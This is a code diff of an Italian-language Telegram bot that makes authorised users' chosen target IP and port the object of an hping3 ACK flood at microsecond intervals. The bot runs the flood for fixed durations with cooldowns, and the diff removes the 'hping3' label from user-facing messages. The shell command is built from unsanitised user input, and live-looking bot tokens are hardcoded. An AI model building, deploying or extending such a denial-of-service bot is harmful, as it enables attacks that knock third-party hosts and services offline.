@@ -1,5 +1,5 @@
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext, MessageHandler, Filters
 import subprocess
 import os
 import signal
@@ -10,12 +10,12 @@ import time
 import json
 
 # ================= CONFIG =================
-TOKEN = "8583422659:AAH4nq8agp5urKtDU84jxVX0eZKKeUE9fOw"
+TOKEN = "8386952835:AAEJ8hXDq0NRUje_5eChujRZhBwz0Vw2CLI"
 MASTER_ID = 5699538596
 AUTHORIZED_IDS_FILE = "authorized_ids.json"
 MONITOR_INTERVAL = 1
-HPING_DURATION = 300
-HPING_COOLDOWN = 110
+HPING_DURATION = 130
+HPING_COOLDOWN = 30
 # =========================================
 
 # Caricamento ID autorizzati
@@ -30,6 +30,7 @@ else:
 HOSTNAME = socket.gethostname()
 processes = {}
 monitor_threads = {}
+awaiting_ip = {}  # stato attesa IP per ogni utente
 
 # ---------- UTILS ----------
 def save_ids():
@@ -48,7 +49,7 @@ def is_master(user_id):
 
 def build_main_keyboard():
     keyboard = [
-        [InlineKeyboardButton("🟢 START hping3", callback_data="start")],
+        [InlineKeyboardButton("🟢 START", callback_data="start")],
         [InlineKeyboardButton("💻 CPU", callback_data="cpu")],
         [InlineKeyboardButton("⛔ STOP", callback_data="stop")],
         [InlineKeyboardButton("ℹ️ STATUS", callback_data="status")],
@@ -110,12 +111,14 @@ def button_handler(update: Update, context: CallbackContext):
     elif query.data == "status":
         show_status(user_id, query)
     elif query.data == "start":
-        # Chiediamo ip:port tramite messaggio
-        context.bot.send_message(user_id, "📌 Invia l'IP e la PORTA nel formato: ip:port")
+        chat_id = query.message.chat_id
+        awaiting_ip[user_id] = True
+        context.bot.send_message(chat_id, "📌 Invia l'IP e la PORTA nel formato: example 127.0.0.1:53")
 
 # ---------- CPU MONITOR ----------
 def show_cpu(user_id, query, context):
-    msg = context.bot.send_message(chat_id=user_id, text=get_cpu_status())
+    chat_id = query.message.chat_id
+    msg = context.bot.send_message(chat_id=chat_id, text=get_cpu_status())
     stop_event = threading.Event()
     key = f"cpu_{user_id}"
     monitor_threads[key] = stop_event
@@ -154,11 +157,11 @@ def start_hping(update: Update, context: CallbackContext):
             update.message.reply_text(f"⏱️ Cooldown attivo: {remaining}s")
             return
 
-    cmd = f"hping3 {ip} -A -p {port} -d 7777 -i u1"
+    cmd = f"hping3 {ip} -A -p {port} -d 64 -i u1"
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
     end_time = now + HPING_DURATION
-    processes[key] = {'proc': proc, 'end_time': end_time, 'cooldown': now + HPING_DURATION + HPING_COOLDOWN}
-    msg = update.message.reply_text(f"⏳ Avvio hping3 su {ip}:{port} per {HPING_DURATION}s")
+    processes[key] = {'proc': proc, 'end_time': end_time, 'coldown': now + HPING_DURATION + HPING_COOLDOWN}
+    msg = update.message.reply_text(f"⏳ Avvio su {ip}:{port} per {HPING_DURATION}s")
 
     def countdown():
         while True:
@@ -168,7 +171,7 @@ def start_hping(update: Update, context: CallbackContext):
                 break
             try:
                 context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id,
-                                              text=f"⏳ hping3 in esecuzione: {remaining}s")
+                                              text=f"⏳ in esecuzione: {remaining}s")
             except:
                 pass
             time.sleep(1)
@@ -210,6 +213,20 @@ def start(update: Update, context: CallbackContext):
         return
     update.message.reply_text(f"🤖 Bot attivo su {HOSTNAME}", reply_markup=build_main_keyboard())
 
+# ---------- IP:PORT HANDLER ----------
+def ipport_handler(update: Update, context: CallbackContext):
+    user_id = update.effective_user.id
+    if not is_authorized(user_id):
+        return
+    if not awaiting_ip.get(user_id, False):
+        return  # ignora messaggi casuali
+    text = update.message.text.strip()
+    if ":" not in text:
+        update.message.reply_text("Formato errato, usa ip:porta")
+        return
+    start_hping(update, context)
+    awaiting_ip[user_id] = False
+
 # ---------- MAIN ----------
 def main():
     updater = Updater(TOKEN, use_context=True)
@@ -222,8 +239,8 @@ def main():
     # Start command
     dp.add_handler(CommandHandler("start", start))
 
-    # Captura ip:port per hping3
-    dp.add_handler(CommandHandler("ipport", start_hping))  # l’utente deve inviare ip:port come messaggio privato
+    # Handler per catturare messaggi ip:porta senza usare comando
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, ipport_handler))
 
     # Inline buttons
     dp.add_handler(CallbackQueryHandler(button_handler))
